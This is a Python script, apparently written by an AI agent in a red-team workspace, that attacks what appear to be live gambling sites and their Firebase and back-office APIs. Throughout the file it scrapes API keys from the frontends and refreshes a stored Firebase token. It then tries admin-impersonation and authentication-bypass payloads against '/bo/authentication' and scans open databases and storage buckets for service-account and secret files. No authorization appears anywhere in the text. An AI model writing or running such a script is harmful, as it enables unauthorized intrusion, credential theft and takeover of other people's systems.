#!/usr/bin/env python3
"""probe_firebase_key.py — Extract Firebase API key for vak88z project from player frontend.
   Then refresh the expired Firebase ID token and try service-account auth paths.
"""
import json, pathlib, re, requests, time, base64

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
FB_REFRESH = pathlib.Path("/home/kzp/claude-red/fb_refresh_token.txt").read_text().strip()
JWT_VAK    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

# ── 0. Try we88zz Firebase project directly (user hint) ──────────────────────
print("=== we88zz Firebase project probe ===")
WE88ZZ_RTDB = "https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app"
WE88ZZ_STORAGE = "https://firebasestorage.googleapis.com/v0/b/we88zz.appspot.com"
FB_ID_TOKEN = pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip()

# Try RTDB without auth (check rules)
for path in ["/.json?shallow=true", "/config.json", "/users.json?shallow=true",
             "/admin.json?shallow=true"]:
    try:
        r = requests.get(f"{WE88ZZ_RTDB}{path}", timeout=10)
        print(f"  RTDB {path}: HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"  RTDB {path}: {e}")

# Try with expired Firebase token (cross-project attempt)
try:
    r = requests.get(f"{WE88ZZ_RTDB}/.json?auth={FB_ID_TOKEN}&shallow=true", timeout=10)
    print(f"  RTDB with fb_id_token: HTTP {r.status_code}: {r.text[:200]}")
except Exception as e:
    print(f"  RTDB with fb_id_token: {e}")

# Try Firebase storage listing
for path in ["/o?maxResults=10", "/o/service_account.json", "/o/config.json"]:
    try:
        r = requests.get(f"{WE88ZZ_STORAGE}{path}", timeout=10)
        if r.status_code == 200:
            print(f"  [!!!] Storage {path}: {r.text[:300]}")
        elif r.status_code not in (400, 403, 404):
            print(f"  Storage {path}: HTTP {r.status_code}: {r.text[:100]}")
    except Exception as e:
        print(f"  Storage {path}: {e}")

# Try Firebase Auth REST API (sign in anonymously to get we88zz token)
# This needs the we88zz API key
print("\n  Trying to get we88zz API key via Firebase identity endpoint...")
try:
    r = requests.post(
        "https://identitytoolkit.googleapis.com/v1/accounts:signUp",
        params={"key": "we88zz"},  # sometimes project_id works as key
        json={"returnSecureToken": True},
        timeout=10
    )
    print(f"  signUp(key=we88zz): HTTP {r.status_code}: {r.text[:200]}")
except Exception as e:
    print(f"  signUp(key=we88zz): {e}")

# ── 1. Fetch player frontend HTML to find Firebase config ─────────────────────
print("\n=== Fetching m.vak88z2.com for Firebase config ===")
sites = [
    "https://m.vak88z2.com",
    "https://we88c.com",       # domain change 2026-10-07
    "https://m.we88c.com",
    "https://vak88z2.com",
    "https://we88zz.web.app",  # Firebase hosting for we88zz project
    "https://we88zz.firebaseapp.com",
]

firebase_key = None
firebase_project = None
# Track per-project: vak88z is the player project (refresh token belongs here)
vak88z_key = None
we88zz_key = None

for site in sites:
    try:
        r = requests.get(site, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        print(f"\n  {site}: HTTP {r.status_code}")
        if r.ok:
            html = r.text
            # Look for Firebase API key (AIzaSy...)
            keys = re.findall(r'AIzaSy[0-9A-Za-z_-]{33}', html)
            if keys:
                print(f"  [!!!] Firebase API keys found: {keys}")
                firebase_key = firebase_key or keys[0]  # keep FIRST found

            # Look for Firebase config object
            configs = re.findall(r'apiKey:\s*["\']([^"\']+)["\']', html)
            if configs:
                print(f"  apiKey: {configs}")
                firebase_key = firebase_key or configs[0]

            projects = re.findall(r'projectId:\s*["\']([^"\']+)["\']', html)
            if projects:
                print(f"  projectId: {projects}")
                # Track per-project keys
                proj = projects[0]
                if not firebase_project:
                    firebase_project = proj
                key_this = keys[0] if keys else (configs[0] if configs else None)
                if key_this:
                    if proj == "vak88z":
                        vak88z_key = key_this
                        print(f"  [vak88z key stored]: {key_this}")
                    elif proj == "we88zz":
                        we88zz_key = key_this
                        print(f"  [we88zz key stored]: {key_this}")

            auth_domains = re.findall(r'authDomain:\s*["\']([^"\']+)["\']', html)
            if auth_domains:
                print(f"  authDomain: {auth_domains}")

            # Look for JS bundle URLs
            js_urls = re.findall(r'src="(/_nuxt/[^"]+\.js)"', html)
            print(f"  JS bundles found: {len(js_urls)}")
            for js_url in js_urls[:3]:
                print(f"    {js_url}")
    except Exception as e:
        print(f"  {site}: {e}")

# ── 2. Fetch JS bundles if found ──────────────────────────────────────────────
if firebase_key is None:
    print("\n=== Scanning JS bundles for Firebase config ===")
    # Try common Nuxt bundle paths
    base_urls = ["https://m.vak88z2.com", "https://we88c.com", "https://m.we88c.com"]
    for base in base_urls:
        for bundle in ["/_nuxt/app.js", "/_nuxt/vendor.js", "/_nuxt/commons.app.js",
                       "/js/app.js", "/assets/js/app.js"]:
            try:
                r = requests.get(f"{base}{bundle}", timeout=12,
                                 headers={"User-Agent": "Mozilla/5.0"})
                if r.ok and len(r.text) > 1000:
                    keys = re.findall(r'AIzaSy[0-9A-Za-z_-]{33}', r.text)
                    if keys:
                        print(f"  [!!!] Found in {base}{bundle}: {keys}")
                        firebase_key = keys[0]
                        projects = re.findall(r'projectId:\s*["\']([^"\']+)["\']', r.text)
                        if projects: firebase_project = projects[0]; print(f"  projectId: {projects}")
                        break
            except:
                pass
        if firebase_key: break

print(f"\nFirebase API key (first found): {firebase_key}")
print(f"Firebase project: {firebase_project}")
print(f"vak88z key: {vak88z_key}")
print(f"we88zz key: {we88zz_key}")

# Use vak88z key for refresh (refresh_token belongs to vak88z project)
refresh_key = vak88z_key or firebase_key
print(f"\n[Using for refresh]: {refresh_key}")

# ── 3. Refresh Firebase token with correct vak88z key ─────────────────────────
if refresh_key:
    print("\n=== Refreshing Firebase ID token ===")
    try:
        r = requests.post(
            f"https://securetoken.googleapis.com/v1/token?key={refresh_key}",
            json={"grant_type": "refresh_token", "refresh_token": FB_REFRESH},
            timeout=12
        )
        print(f"  HTTP {r.status_code}: {r.text[:300]}")
        if r.status_code == 200:
            data = r.json()
            new_id_token = data.get("id_token", "")
            pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt").write_text(new_id_token)
            print(f"  [!!!] NEW ID TOKEN saved to fb_id_token_new.txt")
            print(f"  token[:80]: {new_id_token[:80]}")

            # Try new token against bgapi
            print("\n=== NEW Firebase token vs bgapi ===")
            for ep in ["/bo/info/admin", "/bo/authentication"]:
                hdrs = {"Authorization": f"Bearer {new_id_token}",
                        "Content-Type": "application/json",
                        "template": "vn", "Origin": "https://manage.vak88z2.com"}
                r2 = requests.get(f"{BGAPI}{ep}?domain=m.vak88z2.com",
                                  headers=hdrs, timeout=10)
                print(f"  GET {ep}: HTTP {r2.status_code}: {r2.text[:200]}")
    except Exception as e:
        print(f"  Refresh error: {e}")
else:
    print("\n[!] Firebase API key not found — cannot refresh token")
    print("    Trying probe_gsc.py manually next")

# ── 4. Try bgapi POST /bo/authentication with service_account field ────────────
print("\n=== bgapi POST /bo/authentication (service_account variants) ===")
# User hint: "try gsc service_account" - try SA as auth type
admin_obj = {"id": "5958356c-eb4e-4e07-a155-83e4382e3532",
             "username": "admin", "firstname": "admin", "lastname": "admin"}

payloads = [
    {"service_account": True, "username": "admin", "domain": "m.vak88z2.com"},
    {"service_account": JWT_VAK, "username": "admin"},
    {"type": "service_account", "token": JWT_VAK},
    {"auth_type": "gsc", "token": JWT_VAK},
    # BO admin object approach (from handoff hint)
    {**admin_obj, "domain": "m.vak88z2.com"},
    # Firebase token as service credential
    {"firebase_token": pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip()},
]

base_hdrs = {"Content-Type": "application/json",
             "template": "vn", "Origin": "https://manage.vak88z2.com"}

for p in payloads:
    try:
        r = requests.post(f"{BGAPI}/bo/authentication?domain=m.vak88z2.com",
                          headers=base_hdrs, json=p, timeout=10)
        keys_str = str(list(p.keys()))[:40]
        if r.status_code not in (401, 500, 502):
            print(f"  [!!!] {keys_str}: HTTP {r.status_code}: {r.text[:300]}")
        else:
            print(f"  {keys_str}: HTTP {r.status_code}: {r.text[:100]}")
    except Exception as e:
        print(f"  {list(p.keys())}: {e}")

# ── 5. Try GET endpoints on bgapi with service_account header ─────────────────
print("\n=== bgapi with service_account header ===")
for header_name in ["X-Service-Account", "X-GSC-Token", "service_account", "gsc-token"]:
    hdrs = {"Authorization": f"Bearer {JWT_VAK}",
            header_name: "true",
            "Content-Type": "application/json", "template": "vn"}
    try:
        r = requests.get(f"{BGAPI}/bo/authentication?domain=m.vak88z2.com",
                         headers=hdrs, timeout=8)
        if r.status_code < 500:
            print(f"  {header_name}: HTTP {r.status_code}: {r.text[:150]}")
    except Exception as e:
        print(f"  {header_name}: {e}")


# ── 6. Scan vak88 GCS bucket (found in wallet response) ──────────────────────
print("\n=== GCS bucket vak88 scan ===")
vak88_bucket = "vak88"
# List all objects
try:
    r = requests.get(
        f"https://storage.googleapis.com/storage/v1/b/{vak88_bucket}/o?maxResults=100",
        timeout=12
    )
    if r.ok:
        data = r.json()
        items = data.get("items", [])
        print(f"  gs://vak88/ ({len(items)} items):")
        for item in items:
            name = item.get("name", "")
            size = item.get("size", "?")
            is_interesting = any(x in name.lower() for x in
                ["json", "key", "secret", "admin", "service", "credential", "firebase", "sa", "config"])
            marker = "  [!!!]" if is_interesting else "      "
            print(f"  {marker} {name} ({size} bytes)")
    else:
        print(f"  gs://vak88/: HTTP {r.status_code}: {r.text[:200]}")
except Exception as e:
    print(f"  gs://vak88/: {e}")

# Try direct access to common files
for fname in ["service-account.json", "firebase-admin.json", "config.json",
              "we88zz-firebase-adminsdk.json", "vak88-firebase-adminsdk.json"]:
    try:
        r = requests.get(f"https://storage.googleapis.com/{vak88_bucket}/{fname}", timeout=8)
        if r.status_code == 200:
            print(f"  [!!!] FOUND: gs://vak88/{fname}: {r.text[:300]}")
    except:
        pass

print("\n=== DONE ===")
